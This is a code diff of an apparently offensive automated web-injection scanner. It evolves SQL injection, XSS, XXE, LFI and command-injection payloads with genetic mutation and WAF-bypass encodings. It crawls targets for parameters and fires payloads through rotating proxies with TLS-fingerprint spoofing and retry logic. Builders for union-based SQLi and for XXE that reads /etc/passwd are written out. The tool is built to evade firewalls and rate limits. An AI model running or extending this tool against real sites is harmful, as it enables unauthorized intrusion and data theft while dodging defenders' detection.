                     "id": f"GEN-{self.generation}-XSS-{len(children):04d}",
-                    "payload": combined,
-                    "category": "xss",
-                    "length_tier": "evolved",
-                    "encoding": "crossover",
-                    "strategy": "tag_crossover",
-                    "length": len(combined),
+                    "payload": combined, "category": "xss",
+                    "length_tier": "evolved", "encoding": "crossover",
+                    "strategy": "tag_crossover", "length": len(combined),
                     "hash": hashlib.md5(combined.encode(errors='ignore')).hexdigest(),
-                    "built_from_scratch": False,
-                    "generation": self.generation,
+                    "built_from_scratch": False, "generation": self.generation,
                     "timestamp": datetime.now().isoformat(),
                 })
-
-        # Fallback: simple split-and-join
         if not children and len(p1) > 5 and len(p2) > 5:
-            mid1 = len(p1) // 2
-            mid2 = len(p2) // 2
+            mid1 = len(p1) // 2; mid2 = len(p2) // 2
             child = p1[:mid1] + p2[mid2:]
             children.append({
                 "id": f"GEN-{self.generation}-FALL-{len(children):04d}",
-                "payload": child,
-                "category": category,
-                "length_tier": "evolved",
-                "encoding": "crossover",
-                "strategy": "simple_crossover",
-                "length": len(child),
+                "payload": child, "category": category,
+                "length_tier": "evolved", "encoding": "crossover",
+                "strategy": "simple_crossover", "length": len(child),
                 "hash": hashlib.md5(child.encode(errors='ignore')).hexdigest(),
-                "built_from_scratch": False,
-                "generation": self.generation,
+                "built_from_scratch": False, "generation": self.generation,
                 "timestamp": datetime.now().isoformat(),
             })
-
         return children
 
     def _cross_category_crossover(self, p1: Dict, p2: Dict) -> List[Dict]:
-        """Combine payloads from different categories."""
         children = []
-
-        # XSS + SQLi polyglot
         if {p1.get("category"), p2.get("category")} == {"xss", "sqli"}:
             sqli = p1 if p1.get("category") == "sqli" else p2
             xss = p1 if p1.get("category") == "xss" else p2
             polyglot = f"{sqli['payload'][:30]}{xss['payload'][:30]}"
             children.append({
                 "id": f"GEN-{self.generation}-POLY-{len(children):04d}",
-                "payload": polyglot,
-                "category": "polyglot",
-                "length_tier": "evolved",
-                "encoding": "crossover",
-                "strategy": "cross_category",
-                "length": len(polyglot),
+                "payload": polyglot, "category": "polyglot",
+                "length_tier": "evolved", "encoding": "crossover",
+                "strategy": "cross_category", "length": len(polyglot),
                 "hash": hashlib.md5(polyglot.encode(errors='ignore')).hexdigest(),
-                "built_from_scratch": False,
-                "generation": self.generation,
+                "built_from_scratch": False, "generation": self.generation,
                 "timestamp": datetime.now().isoformat(),
             })
-
         return children
 
     def mutate(self, payload_dict: Dict) -> Dict:
-        """Apply mutations dengan negative selection."""
         payload = payload_dict.get("payload", "")
         category = payload_dict.get("category", "xss")
         blocked = self.schema.get_blocked_mutations()
-
-        # Available mutations (excluding blocked ones)
         all_mutations = {
             "case_variation": lambda s: "".join(c.upper() if random.random() < 0.5 else c.lower() for c in s),
             "comment_insertion": lambda s: s.replace(" ", random.choice(["/**/", "/*!*/", "/*x*/"]), 1) if " " in s else s,
@@ -1413,13 +1866,9 @@ class GeneticEvolver:
             "control_char_insert": lambda s: self.waf_bypass.insert_control_chars(s, 0.05),
             "waf_fragment": lambda s: self.waf_bypass.fragment_signature(s, category),
         }
-
         available = {k: v for k, v in all_mutations.items() if k not in blocked}
         if not available:
-            # Reset blocked if all are blocked
             available = all_mutations
-
-        # Apply 1-3 random mutations
         num_muts = random.randint(1, 3)
         mutations_applied = []
         result = payload
@@ -1430,15 +1879,10 @@ class GeneticEvolver:
                 mutations_applied.append(mut_name)
             except:
                 continue
-
-        # Apply adaptive encoding rotation
         result = self.encoder.apply_chain(result)
-
-        # Validate
         is_valid, reason = self.grammar.validate(result, category)
         if not is_valid:
-            result = payload  # Revert if invalid
-
+            result = payload
         mutated = payload_dict.copy()
         mutated["payload"] = result
         mutated["id"] = f"GEN-{self.generation}-MUT-{random.randint(1000,9999)}"
@@ -1464,12 +1908,10 @@ class GeneticEvolver:
 
     def _alt_syntax(self, s: str, category: str) -> str:
         replacements_sql = {
-            "OR": ["||", "OR/**/"],
-            "AND": ["&&", "AND/**/"],
+            "OR": ["||", "OR/**/"], "AND": ["&&", "AND/**/"],
             "SELECT": ["SELECT ALL", "SELECT DISTINCT"],
             "SLEEP": ["BENCHMARK(5000000,MD5(0x1))"],
-            "MID": ["SUBSTR", "SUBSTRING"],
-            "CONCAT": ["CONCAT_WS('',''],"],
+            "MID": ["SUBSTR", "SUBSTRING"], "CONCAT": ["CONCAT_WS('',''],"],
         }
         replacements_xss = {
             "alert(": ["alert`", "window['alert'](", "self['alert'](",
@@ -1484,68 +1926,46 @@ class GeneticEvolver:
         return s
 
     def _hpp_mutate(self, s: str) -> str:
-        if len(s) < 10:
-            return s
+        if len(s) < 10: return s
         mid = len(s) // 2
         return s[:mid] + "&" + s[mid:]
 
     def evolve_generation(self) -> List[Dict]:
-        """Run one full generation of evolution."""
         self.generation += 1
         new_population = []
-
-        # 1. Elitism: keep top performers
-        sorted_pop = sorted(self.population,
-                           key=lambda p: p.get("fitness", 0.5),
-                           reverse=True)
+        sorted_pop = sorted(self.population, key=lambda p: p.get("fitness", 0.5), reverse=True)
         elite_count = max(1, int(len(sorted_pop) * self.elitism_rate))
         new_population.extend(sorted_pop[:elite_count])
-
-        # 2. Crossover
         crossover_count = int(len(self.population) * self.crossover_rate)
         for _ in range(crossover_count // 2):
-            if len(self.population) < 2:
-                break
-            p1 = self.tournament_select()
-            p2 = self.tournament_select()
+            if len(self.population) < 2: break
+            p1 = self.tournament_select(); p2 = self.tournament_select()
             children = self.crossover(p1, p2)
             new_population.extend(children[:2])
-
-        # 3. Mutation
         mutation_count = int(len(self.population) * self.mutation_rate)
         for _ in range(mutation_count):
-            if not self.population:
-                break
+            if not self.population: break
             parent = self.tournament_select()
             child = self.mutate(parent)
             new_population.append(child)
-
-        # 4. Fill remaining with random fresh payloads
         while len(new_population) < len(self.population):
             if self.population:
                 parent = random.choice(self.population)
                 child = self.mutate(parent)
                 new_population.append(child)
-            else:
-                break
-
-        # Deduplicate by hash
-        seen = set()
-        unique = []
+            else: break
+        seen = set(); unique = []
         for p in new_population:
             h = p.get("hash", "")
             if h and h not in seen:
-                seen.add(h)
-                unique.append(p)
-
+                seen.add(h); unique.append(p)
         self.population = unique[:self.max_population]
         return self.population
 
     def update_fitness(self, payload_id: str, fitness: float):
         for p in self.population:
             if p.get("id") == payload_id:
-                p["fitness"] = fitness
-                break
+                p["fitness"] = fitness; break
 
     def get_generation_summary(self) -> str:
         pop_size = len(self.population)
@@ -1558,7 +1978,7 @@ class GeneticEvolver:
 
 
 # ============================================================
-# PARAMETER DISCOVERY (DEEP v5.0 — all v4.0 features preserved)
+# PARAMETER DISCOVERY (preserved from v5.0 — unchanged)
 # ============================================================
 @dataclass
 class Parameter:
@@ -1601,7 +2021,6 @@ class ParameterDiscovery:
         "ref", "referer", "debug", "test", "admin",
         "preview", "draft", "print", "export", "download",
     ]
-
     COMMON_PATHS = [
         "/index.php", "/index.html", "/index.asp", "/index.aspx",
         "/article.php", "/post.php", "/news.php", "/berita.php", "/artikel.php",
@@ -1633,10 +2052,8 @@ class ParameterDiscovery:
 
     def run(self) -> List[Parameter]:
         print(f"\n\033[36m[*]\033[0m Starting DEEP parameter discovery on: \033[1;37m{self.target}\033[0m")
-
         print(f"    \033[36m[1/10]\033[0m Scanning URL query parameters...")
         self._extract_url_params()
-
         print(f"    \033[36m[2/10]\033[0m Fetching main page...")
         html = self._fetch_page(self.target)
         if not html:
@@ -1646,7 +2063,6 @@ class ParameterDiscovery:
                 self.target = alt
                 self.parsed = urlparse(alt)
                 self.base_url = f"{self.parsed.scheme}://{self.parsed.netloc}"
-
         if not html:
             print(f"    \033[31m[!]\033[0m Cannot fetch target, continuing with fuzzing...")
         else:
@@ -1659,7 +2075,6 @@ class ParameterDiscovery:
             self._extract_js_endpoints(html)
             print(f"    \033[36m[6/10]\033[0m Deep crawling internal links (2 levels)...")
             self._deep_crawl_links(html)
-
         print(f"    \033[36m[7/10]\033[0m Scanning robots.txt & sitemap.xml...")
         self._scan_robots_sitemap()
         print(f"    \033[36m[8/10]\033[0m Parameter bruteforce/fuzzing...")
@@ -1668,39 +2083,29 @@ class ParameterDiscovery:
         self._scan_common_endpoints()
         print(f"    \033[36m[10/10]\033[0m Detecting path-based parameters...")
         self._detect_path_params()
-
-        # Deduplicate
-        seen = set()
-        unique = []
+        seen = set(); unique = []
         for p in self.parameters:
             key = f"{p.location}:{p.name}:{p.method}:{p.url}"
             if key not in seen:
-                seen.add(key)
-                unique.append(p)
+                seen.add(key); unique.append(p)
         self.parameters = unique
-
         print(f"\n    \033[32m[✓]\033[0m DEEP Discovery: \033[1;37m{len(self.parameters)}\033[0m unique parameters")
         return self.parameters
 
     def _fetch_page(self, url: str) -> Optional[str]:
-        if url in self.visited_urls:
-            return None
+        if url in self.visited_urls: return None
         self.visited_urls.add(url)
         try:
             if self.client:
                 resp = self.client.get(url)
-                if resp.status_code < 400:
-                    return resp.text
-        except Exception:
-            pass
+                if resp.status_code < 400: return resp.text
+        except Exception: pass
         try:
             if HAS_REQUESTS:
-                resp = requests.get(url, headers={"User-Agent": random.choice(STEALTH_HEADERS)},
+                resp = requests.get(url, headers=get_stealth_headers(),
                                    timeout=20, verify=False)
-                if resp.status_code < 400:
-                    return resp.text
-        except Exception:
-            pass
+                if resp.status_code < 400: return resp.text
+        except Exception: pass
         return None
 
     def _fetch_page_raw(self, url: str):
@@ -1708,15 +2113,13 @@ class ParameterDiscovery:
             if self.client:
                 resp = self.client.get(url)
                 return resp.text, resp.status_code, len(resp.content)
-        except:
-            pass
+        except: pass
         try:
             if HAS_REQUESTS:
-                resp = requests.get(url, headers={"User-Agent": random.choice(STEALTH_HEADERS)},
+                resp = requests.get(url, headers=get_stealth_headers(),
                                    timeout=15, verify=False)
                 return resp.text, resp.status_code, len(resp.content)
-        except:
-            pass
+        except: pass
         return None, 0, 0
 
     def _extract_url_params(self):
@@ -1805,8 +2208,7 @@ class ParameterDiscovery:
             full = urljoin(self.target, a["href"])
             p = urlparse(full)
             if p.netloc == self.parsed.netloc and not any(p.path.lower().endswith(e) for e in skip):
-                links.add(full)
-                self.discovered_urls.add(full)
+                links.add(full); self.discovered_urls.add(full)
                 if p.query:
                     for name, vals in parse_qs(p.query).items():
                         self.parameters.append(Parameter(name=name, location="url_query",
@@ -1820,13 +2222,11 @@ class ParameterDiscovery:
                 h = self._fetch_page(url)
                 if not h: continue
                 crawled += 1
-                self._extract_form_params(h)
-                self._extract_hidden_params(h)
+                self._extract_form_params(h); self._extract_hidden_params(h)
                 self._extract_js_endpoints(h)
                 sub = BeautifulSoup(h, "html.parser")
                 for a in sub.find_all("a", href=True):
-                    sf = urljoin(url, a["href"])
-                    sp = urlparse(sf)
+                    sf = urljoin(url, a["href"]); sp = urlparse(sf)
                     if sp.netloc == self.parsed.netloc:
                         self.discovered_urls.add(sf)
                         if sp.query:
@@ -1845,8 +2245,7 @@ class ParameterDiscovery:
         if robots:
             urls = re.findall(r'(?:Disallow|Allow):\s*(/[^\s#]+)', robots)
             for path in urls[:40]:
-                full = urljoin(self.base_url, path)
-                p = urlparse(full)
+                full = urljoin(self.base_url, path); p = urlparse(full)
                 if p.query:
                     for name in parse_qs(p.query):
                         self.parameters.append(Parameter(name=name, location="robots_txt",
@@ -1854,8 +2253,7 @@ class ParameterDiscovery:
                 else:
                     clean = full.rstrip("*").rstrip("$")
                     if not any(c in clean for c in ['*','$','{','}']):
-                        rpaths.append(clean)
-                        self.discovered_urls.add(clean)
+                        rpaths.append(clean); self.discovered_urls.add(clean)
         for surl in [f"{self.base_url}/sitemap.xml", f"{self.base_url}/sitemap_index.xml"]:
             sc = self._fetch_page(surl)
             if sc:
@@ -1979,7 +2377,7 @@ class ParameterDiscovery:
 
 
 # ============================================================
-# FEEDBACK LEARNER (Enhanced with Negative Selection)
+# FEEDBACK LEARNER (preserved from v5.0 + v6.0 rate limit tracking)
 # ============================================================
 class FeedbackLearner:
     def __init__(self):
@@ -2002,11 +2400,13 @@ class FeedbackLearner:
         }
         self.lr = 0.15
         self.history = []
-        # Negative selection
         self.blocked_mutations = set()
         self.mutation_fail_count = defaultdict(int)
         self.blocked_encodings = set()
         self.encoding_fail_count = defaultdict(int)
+        # v6.0: rate limit tracking
+        self.rate_limit_count = 0
+        self.last_rate_limit_time = 0
 
     def record_feedback(self, payload_dict: Dict, result):
         cat = payload_dict.get("category", "unknown")
@@ -2022,6 +2422,11 @@ class FeedbackLearner:
             self.response_times.append(resp_time)
             if len(self.response_times) >= 10:
                 self.baseline_response_time = sum(self.response_times[-50:]) / len(self.response_times[-50:])
+
+        # v6.0: Track rate limiting
+        if status == 429:
+            self.rate_limit_count += 1
+            self.last_rate_limit_time = time.time()
 
         if resp_type == "server_output":
             self.category_scores[cat]["success"] += 1
@@ -2046,8 +2451,6 @@ class FeedbackLearner:
                 "status": status
             })
             self._detect_waf(result.evidence, status)
-
-            # NEGATIVE SELECTION: blacklist failed mutations
             for mut in mutations:
                 self.mutation_fail_count[mut] += 1
                 if self.mutation_fail_count[mut] >= 3:
@@ -2079,8 +2482,7 @@ class FeedbackLearner:
         for name, s in signs.items():
             for sig in s:
                 if sig in el:
-                    self.waf_detected = True
-                    self.waf_type = name
+                    self.waf_detected = True; self.waf_type = name
                     self.waf_signatures.append(sig)
         if status in [403, 406, 429, 503]:
             self.waf_detected = True
@@ -2127,8 +2529,8 @@ class FeedbackLearner:
         if self.server_tech["framework"]: lines.append(f"FW: {self.server_tech['framework']}")
         if self.server_tech["database"]: lines.append(f"DB: {self.server_tech['database']}")
         if self.waf_detected: lines.append(f"WAF: {self.waf_type or 'Detected'}")
-        if self.blocked_mutations:
-            lines.append(f"Blacklisted: {len(self.blocked_mutations)} muts")
+        if self.blocked_mutations: lines.append(f"Blacklisted: {len(self.blocked_mutations)} muts")
+        if self.rate_limit_count > 0: lines.append(f"429s: {self.rate_limit_count}")
         if self.successful_patterns:
             best = max(self.category_scores.keys(),
                       key=lambda c: self.category_scores[c]["success"], default="")
@@ -2137,7 +2539,7 @@ class FeedbackLearner:
 
 
 # ============================================================
-# ML PAYLOAD GENERATOR v5.0 (ALL v4.0 features + Grammar + Polyglot)
+# ML PAYLOAD GENERATOR (preserved from v5.0)
 # ============================================================
 class MLPayloadGenerator:
     ATOMS = {
@@ -2216,7 +2618,6 @@ class MLPayloadGenerator:
         "whitespace": [" ","\\t","\\n","\\r","%09","%0a","%0d","/**/",
                        "/*x*/","/**x**/","+","%20","%0b","%0c","/*!*/","/*!50000*/"],
     }
-
     CATEGORIES = ["sqli","xss","ssti","cmdi","lfi","xxe","crlf","redirect","polyglot"]
 
     def __init__(self, learner: FeedbackLearner = None,
@@ -2235,7 +2636,6 @@ class MLPayloadGenerator:
 
     def _pick(self, key): return self.rng.choice(self.ATOMS[key])
 
-    # ---- Encoding (preserved from v4.0) ----
     def _enc_raw(self, s): return s
     def _enc_url(self, s): return quote(s, safe="")
     def _enc_double_url(self, s): return quote(quote(s, safe=""), safe="")
@@ -2252,7 +2652,6 @@ class MLPayloadGenerator:
         return random.choice([self._enc_url, self._enc_unicode, self._enc_html_entity,
                               self._enc_hex, self._enc_octal])(s)
 
-    # ---- 20+ Mutation techniques (preserved from v4.0) ----
     def _mut_case_variation(self, s):
         return "".join(c.upper() if random.random() < 0.5 else c.lower() for c in s)
     def _mut_comment_injection(self, s):
@@ -2362,15 +2761,12 @@ class MLPayloadGenerator:
     def _apply_mutations(self, payload: str, num: int = 0) -> str:
         if num == 0: num = random.randint(0, 3)
         muts = self._get_all_mutations()
-        # Filter out blocked mutations
-        blocked = self.learner.blocked_mutations
         for _ in range(num):
             m = random.choice(muts)
             try: payload = m(payload)
             except: continue
         return payload
 
-    # ---- PAYLOAD BUILDERS (ALL from v4.0 preserved) ----
     def _build_sqli(self, tier):
         strats = ["error_based","union_based","time_based","boolean_based",
                   "stacked_query","second_order","out_of_band","inline_comment",
@@ -2379,7 +2775,6 @@ class MLPayloadGenerator:
                   "between_like","rlike_regexp","procedure_analyse"]
         s = self.rng.choice(strats)
         q = self._pick("sql_string_break"); c = self._pick("sql_comment"); ws = self._pick("whitespace")
-
         if s == "error_based":
             l = self._pick("sql_logic")
             if tier == "short": return f"{q}{ws}{l}{ws}1=1{c}", s
@@ -2387,8 +2782,7 @@ class MLPayloadGenerator:
                     f"COUNT(*),CONCAT(0xdeadbeef,FLOOR(RAND(0)*2))x{ws}FROM{ws}"
                     f"information_schema.tables{ws}GROUP{ws}BY{ws}x)a){c}"), s
         elif s == "union_based":
-            cols = self.rng.randint(1, 10)
-            nulls = ",".join(["NULL"] * cols)
+            cols = self.rng.randint(1, 10); nulls = ",".join(["NULL"] * cols)
             if tier == "short": return f"{q}{ws}UNION{ws}SELECT{ws}{nulls}{c}", s
             return (f"{q}{ws}UNION{ws}ALL{ws}SELECT{ws}{nulls},CONCAT(0x7e,VERSION(),0x7e),"
                     f"{nulls}{ws}FROM{ws}information_schema.tables{c}"), s
@@ -2436,7 +2830,6 @@ class MLPayloadGenerator:
                   "svg_use","foreign_object","animate_values","svg_set"]
         s = self.rng.choice(strats)
         js = self._pick("xss_js"); ws = self._pick("whitespace")
-
         if s == "classic_tag":
             return f"<{self._pick('xss_tag')}{ws}{self._pick('xss_event')}={js}>", s
         elif s == "event_handler":
@@ -2563,8 +2956,7 @@ class MLPayloadGenerator:
 
     def _build_xxe(self, tier):
         strats = ["classic","parameter_entity","blind_oob","error_based","xinclude"]
-        s = self.rng.choice(strats)
-        e = self.rng.choice(["xxe","foo","x","evil"])
+        s = self.rng.choice(strats); e = self.rng.choice(["xxe","foo","x","evil"])
         if s == "classic":
             return (f'<?xml version="1.0"?><!DOCTYPE {e} ['
                     f'<!ENTITY {e} SYSTEM "file:///etc/passwd">]>'
@@ -2638,39 +3030,25 @@ class MLPayloadGenerator:
         }
         tiers = ["short","long","super_long","ultra_long"]
         weights = self.learner.get_adaptive_weights()
-        payloads = []
-        seen = set()
-
+        payloads = []; seen = set()
         for i in range(count):
             cat = self.rng.choices(self.CATEGORIES, weights=weights, k=1)[0]
             tier = self.rng.choice(tiers)
             raw, strategy = builders[cat](tier)
             raw = self._apply_length_tier(raw, tier)
-
             mut_count = {"short":0,"long":1,"super_long":2,"ultra_long":3}[tier]
             raw = self._apply_mutations(raw, mut_count)
-
-            # Grammar validation
             is_valid, reason = self.grammar.validate(raw, cat)
             if not is_valid:
-                # Try to fix or regenerate
                 raw = self._apply_mutations(builders[cat](tier)[0], mut_count)
-
-            # WAF bypass application
             if self.learner.waf_detected:
-                raw, _ = self.waf_bypass.apply_waf_bypass(
-                    raw, cat, self.learner.waf_type)
-
-            # Adaptive encoding rotation
+                raw, _ = self.waf_bypass.apply_waf_bypass(raw, cat, self.learner.waf_type)
             raw = self.encoder.apply_chain(raw)
-
             h = hashlib.md5(raw.encode(errors='ignore')).hexdigest()
             if h in seen:
                 raw += self._pick("whitespace") + str(self.rng.randint(1,9999))
                 h = hashlib.md5(raw.encode(errors='ignore')).hexdigest()
-            seen.add(h)
-            self.payload_counter += 1
-
+            seen.add(h); self.payload_counter += 1
             payloads.append({
                 "id": f"BRUT-{self.payload_counter:06d}",
                 "payload": raw, "category": cat,
@@ -2680,7 +3058,6 @@ class MLPayloadGenerator:
                 "mutations_applied": mut_count,
                 "timestamp": datetime.now().isoformat(),
             })
-
         self.generated_payloads = payloads
         return payloads
 
@@ -2692,21 +3069,17 @@ class MLPayloadGenerator:
             "ssti": self._build_ssti, "cmdi": self._build_cmdi,
             "lfi": self._build_lfi, "polyglot": self._build_polyglot,
         }
-
         for fp in failed_payloads[:15]:
             cat = fp.get("category", "xss")
             builder = builders.get(cat, self._build_xss)
             for _ in range(5):
                 raw, strategy = builder("ultra_long")
-                # Apply heavy mutations + WAF bypass
                 raw = self._apply_mutations(raw, 5)
                 raw, _ = self.waf_bypass.apply_waf_bypass(raw, cat, self.learner.waf_type)
                 raw = self.encoder.apply_chain(raw)
-                # Grammar validate
                 is_valid, _ = self.grammar.validate(raw, cat)
                 if not is_valid:
                     raw = self._apply_mutations(builder("ultra_long")[0], 3)
-
                 h = hashlib.md5(raw.encode(errors='ignore')).hexdigest()
                 self.payload_counter += 1
                 advanced.append({
@@ -2722,7 +3095,7 @@ class MLPayloadGenerator:
 
 
 # ============================================================
-# RESPONSE ANALYZER (preserved from v4.0)
+# RESPONSE ANALYZER (preserved from v5.0)
 # ============================================================
 @dataclass
 class InjectionResult:
@@ -2742,6 +3115,10 @@ class InjectionResult:
     anomaly_score: float
     injection_context: str
     generation_id: str
+    proxy_used: str           # v6.0
+    tls_fingerprint: str      # v6.0
+    throttle_delay_ms: float  # v6.0
+    retry_count: int          # v6.0
     timestamp: str
 
     def to_dict(self): return asdict(self)
@@ -2773,7 +3150,7 @@ class ResponseAnalyzer:
         r"failed\s+to\s+open\s+stream",r"open_basedir",
         r"permission\s+denied",r"no\s+such\s+file\s+or\s+directory",
         r"xdebug",r"var_dump",r"print_r",r"debug.*?trace",
-        r"stack\s*trace",r"call\s+stack",
+        r"stack\s*trace",r"call\s*stack",
     ]
     WAF_BLOCK_PATTERNS = [
         r"blocked\s+by",r"access\s+denied",r"forbidden",
@@ -2781,7 +3158,7 @@ class ResponseAnalyzer:
         r"suspicious\s+activity",r"malicious\s+request",
         r"incapsula",r"cloudflare",r"akamai",
         r"imperva",r"sucuri",r"mod_security",
-        r"your\s+request\s+has\s+been\s+blocked",
+        r"your\s*request\s*has\s*been\s*blocked",
         r"firewall",r"protected\s+by",
     ]
     LFI_SUCCESS_PATTERNS = [r"root:[x*]:0:0:",r"daemon:",r"www-data:",r"bin:",r"nobody:"]
@@ -2793,41 +3170,33 @@ class ResponseAnalyzer:
 
     def analyze(self, response_text, status_code, response_time):
         text = response_text or ""
-        snippet = ""
-        anomaly = 0.0
-
+        snippet = ""; anomaly = 0.0
         for p in self.waf_patterns:
             m = p.search(text)
             if m:
                 snippet = self._extract_snippet(text, m.start())
                 anomaly = 85.0
                 return ("blocked", f"WAF: {m.group(0)[:40]}", False, snippet, anomaly)
-
         if status_code in [403, 406, 429, 503]:
             anomaly = 70.0 + (status_code - 400)
             return ("blocked", f"Status {status_code}", False, text[:60], anomaly)
-
         for p in self.lfi_patterns:
             m = p.search(text)
             if m:
                 anomaly = 100.0
                 return ("server_output", f"LFI: {m.group(0)[:60]}", True, m.group(0)[:60], anomaly)
-
         for p in self.server_patterns:
             m = p.search(text)
             if m:
                 snippet = self._extract_snippet(text, m.start())
                 anomaly = 90.0
                 return ("server_output", f"Error: {m.group(0)[:80]}", True, snippet, anomaly)
-
         if response_time > 4500:
             anomaly = 80.0
             return ("server_output", f"Delay: {response_time:.0f}ms", True, f"[Delay {response_time:.0f}ms]", anomaly)
-
         if re.search(r"(?i)stack\s*trace|call\s*stack|backtrace", text):
             anomaly = 85.0
             return ("server_output", "Stack trace", True, text[:80], anomaly)
-
         snippet = self._extract_snippet(text, 0)
         anomaly = 10.0
         return ("raw_html", "Normal response", False, snippet[:60], anomaly)
@@ -2843,15 +3212,28 @@ class ResponseAnalyzer:
 
 
 # ============================================================
-# INJECTOR (HTTP + Browser, preserved from v4.0 + WAF bypass)
+# INJECTOR v6.0 (Enhanced with Proxy + TLS + Throttle + Retry)
 # ============================================================
 class Injector:
-    def __init__(self, target):
+    def __init__(self, target, proxy_manager: ProxyPoolManager = None,
+                 tls_engine: TLSFingerprintEngine = None,
+                 throttler: AdaptiveThrottler = None,
+                 retry_engine: RetryEngine = None):
         self.target = target
-        self.client = get_stealth_client()
+        self.proxy_manager = proxy_manager or ProxyPoolManager()
+        self.tls_engine = tls_engine or TLSFingerprintEngine()
+        self.throttler = throttler or AdaptiveThrottler()
+        self.retry_engine = retry_engine or RetryEngine(
+            self.throttler, self.proxy_manager, self.tls_engine
+        )
         self.analyzer = ResponseAnalyzer()
         self.waf_bypass = WAFBypassEngine()
         self.browser = None
+        # v6.0: tracking
+        self.last_proxy_used = None
+        self.last_tls_fp = ""
+        self.last_throttle_delay = 0.0
+        self.last_retry_count = 0
 
     def _init_browser(self):
         if self.browser or not HAS_PLAYWRIGHT: return
@@ -2865,23 +3247,122 @@ class Injector:
             try: self.browser.close(); self._pw.stop()
             except: pass
 
+    def _make_http_request(self, url: str, method: str = "GET",
+                          params: Dict = None, data: Dict = None,
+                          proxy_dict: Dict = None,
+                          extra_headers: Dict = None) -> Tuple[Optional[str], int, float, int]:
+        """
+        v6.0: Make HTTP request with TLS fingerprint spoofing priority,
+        then fallback to httpx, then requests.
+        """
+        headers = get_stealth_headers()
+        if extra_headers:
+            headers.update(extra_headers)
+
+        # Priority 1: curl_cffi (TLS fingerprint spoofing)
+        if HAS_CURL_CFFI:
+            result = self.tls_engine.make_request(
+                url, method=method, params=params, data=data,
+                headers=headers, proxy_dict=proxy_dict
+            )
+            if result and result[1] > 0:
+                self.last_tls_fp = self.tls_engine.get_current_fingerprint()
+                return result
+
+        # Priority 2: httpx with HTTP/2
+        if HAS_HTTPX:
+            start = time.time()
+            try:
+                client = get_stealth_client(proxy_dict)
+                if client:
+                    if method == "GET":
+                        resp = client.get(url, params=params, headers=headers, timeout=20)
+                    else:
+                        resp = client.post(url, data=data, headers=headers, timeout=20)
+                    elapsed = (time.time() - start) * 1000
+                    client.close()
+                    self.last_tls_fp = "httpx"
+                    return resp.text, resp.status_code, elapsed, len(resp.content)
+            except:
+                pass
+
+        # Priority 3: requests (fallback)
+        if HAS_REQUESTS:
+            start = time.time()
+            try:
+                if method == "GET":
+                    resp = requests.get(url, params=params, headers=headers,
+                                       proxies=proxy_dict, timeout=20, verify=False)
+                else:
+                    resp = requests.post(url, data=data, headers=headers,
+                                        proxies=proxy_dict, timeout=20, verify=False)
+                elapsed = (time.time() - start) * 1000
+                self.last_tls_fp = "requests"
+                return resp.text, resp.status_code, elapsed, len(resp.content)
+            except:
+                pass
+
+        return None, 0, 0, 0
+
     def inject(self, param, payload_dict, use_browser=False):
         payload = payload_dict["payload"]
         gen_id = payload_dict.get("generation_id", "")
+
         try:
-            start = time.time()
+            # v6.0: Use retry engine for all requests
+            proxy_info = self.proxy_manager.get_next_proxy()
+            proxy_dict = self.proxy_manager.get_proxy_dict(proxy_info)
+            self.last_proxy_used = proxy_info
+
             if use_browser and param.location == "form_input":
                 rt, st, rpt, rsz = self._inject_browser(param, payload)
             else:
-                rt, st, rpt, rsz = self._inject_http(param, payload)
-            elapsed = rpt if rpt > 0 else (time.time()-start)*1000
-            resp_type, evidence, success, snippet, anomaly = self.analyzer.analyze(rt, st, elapsed)
+                # Use retry engine
+                def request_func(url, method, params, data, proxy_dict=None, **kwargs):
+                    return self._make_http_request(
+                        url, method=method, params=params, data=data,
+                        proxy_dict=proxy_dict
+                    )
 
-            # Detect injection context
+                if param.method == "GET":
+                    rt, st, rpt, rsz = self.retry_engine.execute_with_retry(
+                        request_func,
+                        url=param.url,
+                        method="GET",
+                        params={param.name: payload},
+                        data=None,
+                        proxy_dict=proxy_dict,
+                    )
+                else:
+                    rt, st, rpt, rsz = self.retry_engine.execute_with_retry(
+                        request_func,
+                        url=param.url,
+                        method="POST",
+                        params=None,
+                        data={param.name: payload},
+                        proxy_dict=proxy_dict,
+                    )
+
+            elapsed = rpt if rpt > 0 else 0
+            resp_type, evidence, success, snippet, anomaly = self.analyzer.analyze(
+                rt or "", st, elapsed
+            )
+
+            # v6.0: Handle rate limiting in analyzer
+            if st == 429:
+                resp_type = "blocked"
+                evidence = "429 Too Many Requests (Rate Limited)"
+
             ctx = InjectionContext.UNKNOWN
             if rt:
                 detector = ContextDetector()
                 ctx = detector.detect_context(rt, param.name, param.original_value or "1")
+
+            # v6.0: Track throttle delay
+            throttle_stats = self.throttler.get_stats()
+            self.last_throttle_delay = float(
+                throttle_stats.get("current_delay", "0").replace("s", "")
+            ) if isinstance(throttle_stats.get("current_delay"), str) else 0
 
             return InjectionResult(
                 payload_id=payload_dict["id"], payload=payload,
@@ -2892,8 +3373,13 @@ class Injector:
                 response_snippet=snippet, success=success,
                 anomaly_score=anomaly, injection_context=ctx.value,
                 generation_id=gen_id,
+                proxy_used=self.last_proxy_used.url[:50] if self.last_proxy_used else "DIRECT",
+                tls_fingerprint=self.last_tls_fp,
+                throttle_delay_ms=self.last_throttle_delay * 1000,
+                retry_count=self.retry_engine.total_retries,
                 timestamp=datetime.now().isoformat(),
             )
+
         except Exception as e:
             return InjectionResult(
                 payload_id=payload_dict["id"], payload=payload,
@@ -2904,31 +3390,16 @@ class Injector:
                 response_snippet="[connection failed]", success=False,
                 anomaly_score=0, injection_context="unknown",
                 generation_id=gen_id,
+                proxy_used="ERROR", tls_fingerprint="N/A",
+                throttle_delay_ms=0, retry_count=0,
                 timestamp=datetime.now().isoformat(),
             )
 
-    def _inject_http(self, param, payload):
-        start = time.time()
-        try:
-            if self.client:
-                if param.method == "GET":
-                    resp = self.client.get(param.url, params={param.name: payload}, timeout=20)
-                else:
-                    resp = self.client.post(param.url, data={param.name: payload}, timeout=20)
-                return resp.text, resp.status_code, (time.time()-start)*1000, len(resp.content)
-            elif HAS_REQUESTS:
-                h = {"User-Agent": random.choice(STEALTH_HEADERS)}
-                if param.method == "GET":
-                    resp = requests.get(param.url, params={param.name: payload}, headers=h, timeout=20, verify=False)
-                else:
-                    resp = requests.post(param.url, data={param.name: payload}, headers=h, timeout=20, verify=False)
-                return resp.text, resp.status_code, (time.time()-start)*1000, len(resp.content)
-        except: pass
-        return "", 0, (time.time()-start)*1000, 0
-
     def _inject_browser(self, param, payload):
         if not self.browser: self._init_browser()
-        if not self.browser: return self._inject_http(param, payload)
+        if not self.browser: return self._make_http_request(param.url,
+            params={param.name: payload} if param.method == "GET" else None,
+            data={param.name: payload} if param.method != "GET" else None)
         start = time.time()
         try:
             page = self.browser.new_page()
